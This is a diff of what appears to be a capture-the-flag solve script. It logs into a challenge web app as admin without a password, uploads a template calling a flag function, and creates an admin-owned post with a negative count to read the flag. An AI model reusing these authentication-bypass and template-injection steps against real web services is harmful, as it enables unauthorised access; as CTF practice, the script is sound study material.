@@ -17,9 +17,8 @@ s = requests.session()
 s.post(urllib.parse.urljoin(sys.argv[1], 'user/login'), json={'username': admin})
 s.post(urllib.parse.urljoin(sys.argv[1], 'template/upload'), data={'name': 'flag', 'template': '{{ '+getflagfuncname+' }}'})
 s.post(urllib.parse.urljoin(sys.argv[1], 'user/login'), json={'username': user, 'password': passwd})
-s.post(urllib.parse.urljoin(sys.argv[1], 'post/create'), json={'title': 'capoo', 'template': 'capoo', 'data': {'doing1': 'a', 'doing2': 'b'}, 'count': 2})
-s.post(urllib.parse.urljoin(sys.argv[1], 'post/create'), json={'title': 'flag', 'template': 'flag', 'data': {}, 'count': -3, 'owner': admin})
-print(s.get(urllib.parse.urljoin(sys.argv[1], 'post/read'), params={'id': 2}).text)
+s.post(urllib.parse.urljoin(sys.argv[1], 'post/create'), json={'title': 'flag', 'template': 'flag', 'data': {}, 'count': -1, 'owner': admin})
+print(s.get(urllib.parse.urljoin(sys.argv[1], 'post/read'), params={'id': 1}).text)
 
 
 
